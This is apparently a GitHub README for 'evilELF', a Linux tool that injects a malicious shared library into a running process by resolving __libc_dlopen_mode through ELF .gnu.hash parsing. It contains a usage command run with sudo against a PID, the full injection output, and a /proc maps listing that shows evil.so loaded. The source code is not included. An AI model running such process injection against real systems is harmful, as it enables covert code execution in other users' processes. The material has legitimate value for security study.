# evilELF
Malicious use of ELF such as .so inject, func hook and so on.

## injectso

具体参考, [linux进程动态so注入](https://github.com/jmpews/dev2pwn/blob/master/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5.md)

实现恶意 `so` 注入, 采用直接解析 `ELF` 文件的方式, 更加具有通用性, 并以 `.gnu.hash` 进行符号查找, 适用于目前的 `ELF` 结构.

`injectso` 参考 `glibc-2.19`, 用 `ElfW` 宏进行 `32` 和 `64` 字长兼容(目前有一个函数还没有做到 `64` 兼容, 有时间改下).

#### usage

```
➜  inject gcc -w -o inject /vagrant/inject/inject.c /vagrant/inject/utils.c && sudo ./inject 24506 /vagrant/inject/evil.so
attached to pid 24506
[*] start search '__libc_dlopen_mode':
----------------------------------------------------------------
[+] libaray path: /lib/i386-linux-gnu/libc.so.6
[+] gnu.hash:
        nbuckets: 0x3f3
        symndx: 0xa
        nmaskwords: 0x200
        shift2: 0xe
        bitmask_addr: 0xb75281c8
        hash_buckets_addr: 0xb75289c8
        bitmask_addr: 0xb75281c8                                                                                                                                     [0/1762]
        hash_buckets_addr: 0xb75289c8
        hash_values_addr: 0xb7529994
[+] dynstr: 0xb7535474
[+] dynysm: 0xb752bed4
[+] soname: libc.so.6
[*] start gnu hash search:
        new_hash: 0x8049891(4073429154)
        n: 197
        hash buckets index: 0x3c6(966), first dynsym index: 0x8f5(2293)
[*] start bucket search:
        h2: 0xd5e07632(3588257330)
        h2: 0xf2cb98a2(4073429154)
----------------------------------------------------------------
[+] Found '__libc_dlopen_mode' at 0xb764bae0
[+] entry point: 0x8048350
[+] stopped 24506 at eip:0xb76e1428, esp:0xbfec2fec
[+] inject code done 24506 at eip:0x8048366
[*] start search 'evilfunc':
----------------------------------------------------------------
[+] libaray path: /vagrant/inject/evil.so
[+] gnu.hash:
        nbuckets: 0x3
        symndx: 0x7
        nmaskwords: 0x2
        shift2: 0x6
        bitmask_addr: 0xb76db148
        hash_buckets_addr: 0xb76db150
        hash_values_addr: 0xb76db15c
[+] dynstr: 0xb76db244
[+] dynysm: 0xb76db174
[*] start gnu hash search:
        new_hash: 0x80498ec(701380385)
        n: 1
        hash buckets index: 0x2(2), first dynsym index: 0xb(11)
[*] start bucket search:
        h2: 0x29ce3720(701380384)
----------------------------------------------------------------
[+] Found 'evilfunc' at 0xb76db53b
[*] lib injection done!

#查看pid对应maps可以查看到已经加载了恶意的so
➜  inject cat /proc/24506/maps
08048000-08049000 r-xp 00000000 08:01 266876     /home/vagrant/pwn/elf/hello
08049000-0804a000 r--p 00000000 08:01 266876     /home/vagrant/pwn/elf/hello
0804a000-0804b000 rw-p 00001000 08:01 266876     /home/vagrant/pwn/elf/hello
084a2000-084c3000 rw-p 00000000 00:00 0          [heap]
b7527000-b7528000 rw-p 00000000 00:00 0
b7528000-b76d0000 r-xp 00000000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d0000-b76d1000 ---p 001a8000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d1000-b76d3000 r--p 001a8000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d3000-b76d4000 rw-p 001aa000 08:01 2134       /lib/i386-linux-gnu/libc-2.19.so
b76d4000-b76d7000 rw-p 00000000 00:00 0
b76db000-b76dc000 r-xp 00000000 00:1a 1974       /vagrant/inject/evil.so
b76dc000-b76dd000 r--p 00000000 00:1a 1974       /vagrant/inject/evil.so
b76dd000-b76de000 rw-p 00001000 00:1a 1974       /vagrant/inject/evil.so
b76de000-b76e1000 rw-p 00000000 00:00 0
b76e1000-b76e2000 r-xp 00000000 00:00 0          [vdso]
b76e2000-b7702000 r-xp 00000000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
b7702000-b7703000 r--p 0001f000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
b7703000-b7704000 rw-p 00020000 08:01 2153       /lib/i386-linux-gnu/ld-2.19.so
bfea3000-bfec4000 rw-p 00000000 00:00 0          [stack]
➜  inject
```

#### 参考链接:

[PWN之ELF解析](https://github.com/jmpews/dev2pwn/blob/master/PWN%E4%B9%8BELF%E8%A7%A3%E6%9E%90.md)

[linux进程动态so注入](https://github.com/jmpews/dev2pwn/blob/master/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5.md)

#### 利用点

TODO

